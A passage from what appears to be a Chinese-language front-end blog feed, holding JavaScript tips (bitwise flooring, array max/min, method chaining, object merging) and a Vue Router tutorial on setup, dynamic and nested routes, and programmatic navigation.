title="双非位运算符"></a>双非位运算符</h2><pre class=" language-js"><code class="language-js"><span class="token comment" spellcheck="true">// bad</span><span class="token keyword">const</span> floor <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">floor</span><span class="token punctuation">(</span><span class="token number">6.8</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// 6</span><span class="token comment" spellcheck="true">// good</span><span class="token keyword">const</span> floor <span class="token operator">=</span> <span class="token operator">~</span><span class="token operator">~</span><span class="token number">6.8</span> <span class="token comment" spellcheck="true">// 6</span><span class="token comment" spellcheck="true">// ~ 是位运算NOT，按位取反</span><span class="token keyword">var</span> iNum1 <span class="token operator">=</span> <span class="token number">25</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 00000000000000000000000000011001</span><span class="token keyword">var</span> iNum2 <span class="token operator">=</span> <span class="token operator">~</span>iNum1<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 11111111111111111111111111100110</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>iNum2<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 输出 "-26"</span></code></pre><p><strong>总结一下取整方法</strong></p><ul><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/parseInt" target="_blank" rel="noopener">parseInt</a></li><li>Math.floor</li><li>右移运算符 &gt;&gt; (除2后取整)</li><li>双非位运算符 ~~</li></ul><h2 id="数组中的最大值最小值"><a href="#数组中的最大值最小值" class="headerlink" title="数组中的最大值最小值"></a>数组中的最大值最小值</h2><pre class=" language-js"><code class="language-js"><span class="token keyword">const</span> arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">]</span>Math<span class="token punctuation">.</span><span class="token function">max</span><span class="token punctuation">(</span><span class="token operator">...</span>arr<span class="token punctuation">)</span>Math<span class="token punctuation">.</span><span class="token function">min</span><span class="token punctuation">(</span><span class="token operator">...</span>arr<span class="token punctuation">)</span></code></pre><h2 id="巧用this实现链式调用"><a href="#巧用this实现链式调用" class="headerlink" title="巧用this实现链式调用"></a>巧用this实现链式调用</h2><pre class=" language-js"><code class="language-js"><span class="token comment" spellcheck="true">// 实现验证功能的函数</span><span class="token keyword">var</span> CheckObject <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span>CheckObject<span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>checkName <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//验证姓名</span>    <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">;</span><span class="token punctuation">}</span>CheckObject<span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>checEmail <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//验证邮箱</span>    <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">;</span><span class="token punctuation">}</span>CheckObject<span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>checkPassword <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//验证密码</span>    <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">var</span> a <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">CheckObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>a<span class="token punctuation">.</span><span class="token function">checkName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">checkEmail</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">checkPassword</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h2 id="新对象替换老对象"><a href="#新对象替换老对象" class="headerlink" title="新对象替换老对象"></a>新对象替换老对象</h2><p>以新对象替换老对象。例如，利用<a href="https://github.com/tc39/proposal-object-rest-spread" target="_blank" rel="noopener">对象展开运算符</a>我们可以这样写：</p><pre class=" language-js"><code class="language-js">obj <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token operator">...</span>obj<span class="token punctuation">,</span> newProp<span class="token punctuation">:</span> <span class="token number">123</span> <span class="token punctuation">}</span></code></pre><h2 id="对象数组去重"><a href="#对象数组去重" class="headerlink" title="对象数组去重"></a>对象数组去重</h2><pre class=" language-js"><code class="language-js"><span class="token keyword">let</span> arr <span class="token operator">=</span> <span class="token punctuation">[</span>  <span class="token punctuation">{</span>    id<span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">,</span>    name<span class="token punctuation">:</span> <span class="token string">'1'</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span>  <span class="token punctuation">{</span>    id<span class="token punctuation">:</span> <span class="token number">2</span><span class="token punctuation">,</span>    name<span class="token punctuation">:</span> <span class="token string">'2'</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span>  <span class="token punctuation">{</span>    id<span class="token punctuation">:</span> <span class="token number">3</span><span class="token punctuation">,</span>    name<span class="token punctuation">:</span> <span class="token string">'3'</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span>  <span class="token punctuation">{</span>    id<span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">,</span>    name<span class="token punctuation">:</span> <span class="token string">'1'</span>  <span class="token punctuation">}</span><span class="token punctuation">]</span><span class="token function">unique</span><span class="token punctuation">(</span>arr<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">const</span> res <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Map</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> arr<span class="token punctuation">.</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token punctuation">(</span>arr<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token operator">!</span>res<span class="token punctuation">.</span><span class="token function">has</span><span class="token punctuation">(</span>arr<span class="token punctuation">.</span>id<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> res<span class="token punctuation">.</span><span class="token keyword">set</span><span class="token punctuation">(</span>arr<span class="token punctuation">.</span>id<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">,</span></code></pre><h2 id="巧用apply"><a href="#巧用apply" class="headerlink" title="巧用apply"></a>巧用apply</h2><p><strong>数组之间追加</strong></p><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> array1 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">12</span> <span class="token punctuation">,</span> <span class="token string">"foo"</span> <span class="token punctuation">,</span> <span class="token punctuation">{</span>name <span class="token string">"Joe"</span><span class="token punctuation">}</span> <span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">2458</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">var</span> array2 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"Doe"</span> <span class="token punctuation">,</span> <span class="token number">555</span> <span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span>Array<span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>push<span class="token punctuation">.</span><span class="token function">apply</span><span class="token punctuation">(</span>array1<span class="token punctuation">,</span> array2<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">/* array1 值为 [12 , "foo" , {name "Joe"} , -2458 , "Doe" , 555 , 100] */</span></code></pre><p><strong>获取数组中的最大值和最小值</strong></p><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> numbers <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">458</span> <span class="token punctuation">,</span> <span class="token number">120</span> <span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">215</span> <span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">var</span> maxInNumbers <span class="token operator">=</span> Math<span class="token punctuation">.</span>max<span class="token punctuation">.</span><span class="token function">apply</span><span class="token punctuation">(</span>Math<span class="token punctuation">,</span> numbers<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">//458</span>maxInNumbers <span class="token operator">=</span> Math<span class="token punctuation">.</span>max<span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span>Math<span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">458</span> <span class="token punctuation">,</span> <span class="token number">120</span> <span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">215</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//458</span></code></pre><h2 id="合并对象"><a href="#合并对象" class="headerlink" title="合并对象"></a>合并对象</h2><pre class=" language-js"><code class="language-js"><span class="token keyword">const</span> o1 <span class="token operator">=</span> <span class="token punctuation">{</span> a<span class="token punctuation">:</span> <span class="token number">1</span> <span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">const</span> o2 <span class="token operator">=</span> <span class="token punctuation">{</span> b<span class="token punctuation">:</span> <span class="token number">2</span> <span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">const</span> o3 <span class="token operator">=</span> <span class="token punctuation">{</span> c<span class="token punctuation">:</span> <span class="token number">3</span> <span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">const</span> obj <span class="token operator">=</span> Object<span class="token punctuation">.</span><span class="token function">assign</span><span class="token punctuation">(</span>o1<span class="token punctuation">,</span> o2<span class="token punctuation">,</span> o3<span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// { a: 1, b: 2, c: 3 }</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>o1<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// { a: 1, b: 2, c: 3 }, 注意目标对象自身也会改变。</span><span class="token comment" spellcheck="true">// 合并具有相同属性的对象</span><span class="token keyword">const</span> o1 <span class="token operator">=</span> <span class="token punctuation">{</span> a<span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">,</span> b<span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">,</span> c<span class="token punctuation">:</span> <span class="token number">1</span> <span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">const</span> o2 <span class="token operator">=</span> <span class="token punctuation">{</span> b<span class="token punctuation">:</span> <span class="token number">2</span><span class="token punctuation">,</span> c<span class="token punctuation">:</span> <span class="token number">2</span> <span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">const</span> o3 <span class="token operator">=</span> <span class="token punctuation">{</span> c<span class="token punctuation">:</span> <span class="token number">3</span> <span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">const</span> obj <span class="token operator">=</span> Object<span class="token punctuation">.</span><span class="token function">assign</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span> o1<span class="token punctuation">,</span> o2<span class="token punctuation">,</span> o3<span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// { a: 1, b: 2, c: 3 }</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 规范 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Vue Router</title>
      <link href="2020/09/13/Vue-Vue-Router/"/>
      <url>2020/09/13/Vue-Vue-Router/</url>
      
        <content type="html"><![CDATA[<ul><li>Vue Router 使用步骤</li><li>动态路由</li><li>嵌套路由</li><li>编程式导航</li><li>hash模式和history模式</li><li>模拟实现 Vue Router</li></ul><h2 id="Vue-Router-使用步骤"><a href="#Vue-Router-使用步骤" class="headerlink" title="Vue Router 使用步骤"></a>Vue Router 使用步骤</h2><pre class=" language-js"><code class="language-js">├───<span class="token keyword">public</span>└───src    ├───assets    ├───components    ├───router          ├───index<span class="token punctuation">.</span>js    ├───views          ├───Blog<span class="token punctuation">.</span>vue          ├───Index<span class="token punctuation">.</span>vue          ├───Photo<span class="token punctuation">.</span>vue    ├───App<span class="token punctuation">.</span>vue    └───main<span class="token punctuation">.</span>js</code></pre><pre class=" language-js"><code class="language-js"><span class="token comment" spellcheck="true">// router/index.js</span><span class="token keyword">import</span> Vue <span class="token keyword">from</span> <span class="token string">'vue'</span><span class="token keyword">import</span> VueRouter <span class="token keyword">from</span> <span class="token string">'vue-router'</span><span class="token keyword">import</span> Index <span class="token keyword">from</span> <span class="token string">'../views/Index.vue'</span><span class="token comment" spellcheck="true">// 1. 注册路由插件</span>Vue<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>VueRouter<span class="token punctuation">)</span><span class="token comment" spellcheck="true">// 路由规则</span><span class="token keyword">const</span> routes <span class="token operator">=</span> <span class="token punctuation">[</span>  <span class="token punctuation">{</span>    path<span class="token punctuation">:</span> <span class="token string">'/'</span><span class="token punctuation">,</span>    name<span class="token punctuation">:</span> <span class="token string">'Index'</span><span class="token punctuation">,</span>    component<span class="token punctuation">:</span> Index  <span class="token punctuation">}</span><span class="token punctuation">,</span>  <span class="token punctuation">{</span>    path<span class="token punctuation">:</span> <span class="token string">'/blog'</span><span class="token punctuation">,</span>    name<span class="token punctuation">:</span> <span class="token string">'Blog'</span><span class="token punctuation">,</span>    <span class="token comment" spellcheck="true">// route level code-splitting</span>    <span class="token comment" spellcheck="true">// this generates a separate chunk (about.[hash].js) for this route</span>    <span class="token comment" spellcheck="true">// which is lazy-loaded when the route is visited.</span>    component<span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token keyword">import</span><span class="token punctuation">(</span><span class="token comment" spellcheck="true">/* webpackChunkName: "blog" */</span> <span class="token string">'../views/Blog.vue'</span><span class="token punctuation">)</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span>  <span class="token punctuation">{</span>    path<span class="token punctuation">:</span> <span class="token string">'/photo'</span><span class="token punctuation">,</span>    name<span class="token punctuation">:</span> <span class="token string">'Photo'</span><span class="token punctuation">,</span>    <span class="token comment" spellcheck="true">// route level code-splitting</span>    <span class="token comment" spellcheck="true">// this generates a separate chunk (about.[hash].js) for this route</span>    <span class="token comment" spellcheck="true">// which is lazy-loaded when the route is visited.</span>    component<span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token keyword">import</span><span class="token punctuation">(</span><span class="token comment" spellcheck="true">/* webpackChunkName: "photo" */</span> <span class="token string">'../views/Photo.vue'</span><span class="token punctuation">)</span>  <span class="token punctuation">}</span><span class="token punctuation">]</span><span class="token comment" spellcheck="true">// 2. 创建 router 对象</span><span class="token keyword">const</span> router <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">VueRouter</span><span class="token punctuation">(</span><span class="token punctuation">{</span>  routes<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token keyword">export</span> <span class="token keyword">default</span> router</code></pre><pre class=" language-js"><code class="language-js"><span class="token comment" spellcheck="true">// main.js</span><span class="token keyword">import</span> Vue <span class="token keyword">from</span> <span class="token string">'vue'</span><span class="token keyword">import</span> App <span class="token keyword">from</span> <span class="token string">'./App.vue'</span><span class="token keyword">import</span> router <span class="token keyword">from</span> <span class="token string">'./router'</span>Vue<span class="token punctuation">.</span>config<span class="token punctuation">.</span>productionTip <span class="token operator">=</span> <span class="token boolean">false</span><span class="token keyword">new</span> <span class="token class-name">Vue</span><span class="token punctuation">(</span><span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">// 3. 注册 router 对象</span>  router<span class="token punctuation">,</span>  render<span class="token punctuation">:</span> h <span class="token operator">=</span><span class="token operator">></span> <span class="token function">h</span><span class="token punctuation">(</span>App<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">$mount</span><span class="token punctuation">(</span><span class="token string">'#app'</span><span class="token punctuation">)</span></code></pre><pre class=" language-html"><code class="language-html"><span class="token comment" spellcheck="true">&lt;!-- App.vue --></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>template</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>app<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>@/assets/logo.png<span class="token punctuation">"</span></span> <span class="token attr-name">alt</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>nav<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>      <span class="token comment" spellcheck="true">&lt;!-- 5. 创建链接 --></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>router-link</span> <span class="token attr-name">to</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>/<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Index<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>router-link</span><span class="token punctuation">></span></span> |      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>router-link</span> <span class="token attr-name">to</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>/blog<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Blog<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>router-link</span><span class="token punctuation">></span></span> |      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>router-link</span> <span class="token attr-name">to</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>/photo<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Photo<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>router-link</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>    <span class="token comment" spellcheck="true">&lt;!-- 4. 创建路由组建的占位 --></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>router-view</span><span class="token punctuation">/></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>template</span><span class="token punctuation">></span></span></code></pre><blockquote><p>router-view 是用来渲染通过路由映射过来的组件，当路径更改时， 中的内容也会发生更改</p><p>主要应用于单页面中，与router-link配合，渲染router-link 映射过来的组件。</p></blockquote><h2 id="动态路由"><a href="#动态路由" class="headerlink" title="动态路由"></a>动态路由</h2><p>在vue项目中，使用vue-router如果进行不传递参数的路由模式，则称为静态路由；如果能够传递参数，对应的路由数量是不确定的，此时的路由称为动态路由。动态路由，是以冒号为开头的(:)，例子如下：</p><pre class=" language-js"><code class="language-js"><span class="token comment" spellcheck="true">// index.js</span><span class="token keyword">import</span> Vue <span class="token keyword">from</span> <span class="token string">'vue'</span><span class="token keyword">import</span> VueRouter <span class="token keyword">from</span> <span class="token string">'vue-router'</span><span class="token keyword">import</span> Index <span class="token keyword">from</span> <span class="token string">'../views/Index.vue'</span>Vue<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>VueRouter<span class="token punctuation">)</span><span class="token keyword">const</span> routes <span class="token operator">=</span> <span class="token punctuation">[</span>  <span class="token punctuation">{</span>    path<span class="token punctuation">:</span> <span class="token string">'/'</span><span class="token punctuation">,</span>    name<span class="token punctuation">:</span> <span class="token string">'Index'</span><span class="token punctuation">,</span>    component<span class="token punctuation">:</span> Index  <span class="token punctuation">}</span><span class="token punctuation">,</span>  <span class="token punctuation">{</span>    path<span class="token punctuation">:</span> <span class="token string">'/detail/:id'</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">// id占位符</span>    name<span class="token punctuation">:</span> <span class="token string">'Detail'</span><span class="token punctuation">,</span>    <span class="token comment" spellcheck="true">// 开启 props，会把 URL 中的参数传递给组件</span>    <span class="token comment" spellcheck="true">// 在组件中通过 props 来接收 URL 参数</span>    props<span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>    <span class="token comment" spellcheck="true">// route level code-splitting</span>    <span class="token comment" spellcheck="true">// this generates a separate chunk (about.[hash].js) for this route</span>    <span class="token comment" spellcheck="true">// which is lazy-loaded when the route is visited.</span>    <span class="token comment" spellcheck="true">// 只有使用的时候才加载详情页</span>    component<span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token keyword">import</span><span class="token punctuation">(</span><span class="token comment" spellcheck="true">/* webpackChunkName: "detail" */</span> <span class="token string">'../views/Detail.vue'</span><span class="token punctuation">)</span>  <span class="token punctuation">}</span><span class="token punctuation">]</span><span class="token keyword">const</span> router <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">VueRouter</span><span class="token punctuation">(</span><span class="token punctuation">{</span>  routes<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token keyword">export</span> <span class="token keyword">default</span> router</code></pre><pre class=" language-html"><code class="language-html"><span class="token comment" spellcheck="true">&lt;!-- App.vue --></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>template</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>app<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>nav<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>router-link</span> <span class="token attr-name">to</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>/<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Index<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>router-link</span><span class="token punctuation">></span></span> |      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>router-link</span> <span class="token attr-name">to</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>/detail/11<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Detail<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>router-link</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>router-view</span><span class="token punctuation">/></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>template</span><span class="token punctuation">></span></span><span class="token comment" spellcheck="true">&lt;!-- Detail.vue --></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>template</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span>    <span class="token comment" spellcheck="true">&lt;!-- 方式1： 通过当前路由规则，获取数据 --></span>    通过当前路由规则获取：{{ $route.params.id }}    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>    <span class="token comment" spellcheck="true">&lt;!-- 方式2：路由规则中开启 props 传参 --></span>    通过开启 props 获取：{{ id }}  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>template</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript"><span class="token keyword">export</span> <span class="token keyword">default</span> <span class="token punctuation">{</span>  name<span class="token punctuation">:</span> <span class="token string">'Detail'</span><span class="token punctuation">,</span>  props<span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">}</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></code></pre><h2 id="嵌套路由"><a href="#嵌套路由" class="headerlink" title="嵌套路由"></a>嵌套路由</h2><p><img src="https://s1.ax1x.com/2020/09/13/wwzc4K.png" alt="wwzc4K.png"></p><blockquote><p>抽取公共组件 layout.vue 存储 header 和 footer</p></blockquote><pre class=" language-js"><code class="language-js"><span class="token comment" spellcheck="true">//index.js</span><span class="token keyword">import</span> Vue <span class="token keyword">from</span> <span class="token string">'vue'</span><span class="token keyword">import</span> VueRouter <span class="token keyword">from</span> <span class="token string">'vue-router'</span><span class="token comment" spellcheck="true">// 加载组件</span><span class="token keyword">import</span> Layout <span class="token keyword">from</span> <span class="token string">'@/components/Layout.vue'</span><span class="token keyword">import</span> Index <span class="token keyword">from</span> <span class="token string">'@/views/Index.vue'</span><span class="token keyword">import</span> Login <span class="token keyword">from</span> <span class="token string">'@/views/Login.vue'</span>Vue<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>VueRouter<span class="token punctuation">)</span><span class="token keyword">const</span> routes <span class="token operator">=</span> <span class="token punctuation">[</span>  <span class="token punctuation">{</span>    name<span class="token punctuation">:</span> <span class="token string">'login'</span><span class="token punctuation">,</span>    path<span class="token punctuation">:</span> <span class="token string">'/login'</span><span class="token punctuation">,</span>    component<span class="token punctuation">:</span> Login  <span class="token punctuation">}</span><span class="token punctuation">,</span>  <span class="token comment" spellcheck="true">// 嵌套路由</span>  <span class="token punctuation">{</span>    path<span class="token punctuation">:</span> <span class="token string">'/'</span><span class="token punctuation">,</span>    component<span class="token punctuation">:</span> Layout<span class="token punctuation">,</span>    children<span class="token punctuation">:</span> <span class="token punctuation">[</span>      <span class="token punctuation">{</span>        name<span class="token punctuation">:</span> <span class="token string">'index'</span><span class="token punctuation">,</span>        path<span class="token punctuation">:</span> <span class="token string">''</span><span class="token punctuation">,</span>        component<span class="token punctuation">:</span> Index      <span class="token punctuation">}</span><span class="token punctuation">,</span>      <span class="token punctuation">{</span>        name<span class="token punctuation">:</span> <span class="token string">'detail'</span><span class="token punctuation">,</span>        path<span class="token punctuation">:</span> <span class="token string">'detail/:id'</span><span class="token punctuation">,</span>        props<span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        component<span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token keyword">import</span><span class="token punctuation">(</span><span class="token string">'@/views/Detail.vue'</span><span class="token punctuation">)</span>      <span class="token punctuation">}</span>    <span class="token punctuation">]</span>  <span class="token punctuation">}</span><span class="token punctuation">]</span><span class="token keyword">const</span> router <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">VueRouter</span><span class="token punctuation">(</span><span class="token punctuation">{</span>  routes<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token keyword">export</span> <span class="token keyword">default</span> router</code></pre><h2 id="编程式导航的几种方法"><a href="#编程式导航的几种方法" class="headerlink" title="编程式导航的几种方法"></a>编程式导航的几种方法</h2><ul><li>this.$router.push：跳转到指定URL，向history栈添加一个新的记录，点击后退会返回至上一个页面</li><li><p>this.$router.replace：跳转到指定URL，替换history栈中最后一个记录，点击后退会返回至上上一个页面</p></li><li><p>this.$router.go(n)：向前或向后跳转n个页面，n可正（向后跳转）可负（向前跳转）</p></li></ul><pre class=" language-js"><code class="language-js"><span class="token keyword">this</span><span class="token punctuation">.</span>$router<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token punctuation">{</span> name<span class="token punctuation">:</span> <span class="token string">'Detail'</span><span class="token punctuation">,</span> params<span class="token punctuation">:</span> <span class="token punctuation">{</span> id<span class="token punctuation">:</span> <span class="token number">1</span> <span class="token punctuation">}</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token keyword">this</span><span class="token punctuation">.</span>$router<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">)</span><span class="token keyword">this</span><span class="token punctuation">.</span>$router<span class="token punctuation">.</span><span class="token function">go</span><span class="token 